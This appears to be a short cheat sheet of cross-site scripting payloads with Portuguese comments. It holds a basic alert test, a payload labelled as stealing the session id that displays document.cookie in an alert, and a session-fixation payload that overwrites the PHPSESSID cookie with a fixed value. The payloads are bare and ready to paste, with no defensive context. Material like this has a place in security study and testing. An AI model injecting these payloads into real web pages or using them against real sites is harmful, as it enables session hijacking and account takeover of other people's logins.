//XSS
<script>alert("Hello World!");</script>
//Roubar id de sessão
<script>alert("SESSION ID: " + document.cookie);</script>
//Alterar id de sessão
<script>document.cookie="PHPSESSID=134a09eea7aabca2bf0edc88c1e0b8a2";</script>
